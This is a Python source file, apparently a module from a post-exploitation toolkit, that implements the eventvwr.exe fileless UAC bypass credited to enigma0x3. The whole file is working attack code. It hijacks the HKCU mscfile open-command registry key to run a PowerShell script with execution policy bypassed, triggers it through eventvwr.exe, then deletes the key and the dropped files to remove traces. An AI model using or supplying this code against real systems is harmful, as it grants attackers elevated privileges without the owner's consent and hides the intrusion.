import os
import time
import subprocess
from _winreg import *

def deleteTHisRemoteFile(tmp_files):
    for file in tmp_files:
        try:
            os.remove(file)
        except Exception, e:
            pass

def get_env_variables():
    try:
        tmp = os.path.expandvars("%TEMP%")
    except:
        tmp = os.path.expandvars("%APPDATA%")
    
    sysroot = os.path.expandvars("%SYSTEMROOT%")
    
    return tmp, sysroot


def registry_hijacking(mainPowershellScriptRemotePath, files_to_delete):
    #   '''
    #   Based on Invoke-EventVwrBypass, thanks to enigma0x3 (https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
    #   '''
    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)
    powershellPath = '%s\\system32\\WindowsPowerShell\\v1.0\\powershell.exe' % os.path.expandvars("%SYSTEMROOT%")
    mscCmdPath = "Software\Classes\mscfile\shell\open\command"  
    cmd = "{1} -ExecutionPolicy Bypass -File {0}".format(mainPowershellScriptRemotePath, powershellPath)
    
    try:
        # The registry key already exist in HKCU, altering...
        key = OpenKey(HKCU, mscCmdPath, KEY_SET_VALUE)
    except:
        # Adding the registry key in HKCU
        key = CreateKey(HKCU, mscCmdPath)

    registry_key = OpenKey(HKCU, mscCmdPath, 0, KEY_WRITE)
    SetValueEx(registry_key, '', 0, REG_SZ, cmd)
    CloseKey(registry_key)
            
    # Executing eventvwr.exe
    eventvwrPath = os.path.join(os.environ['WINDIR'],'System32','eventvwr.exe')
    output = subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)

    # Sleeping 5 secds...
    time.sleep(5)
    
    #Clean everything
    DeleteKey(HKCU, mscCmdPath)
    deleteTHisRemoteFile(files_to_delete)
    
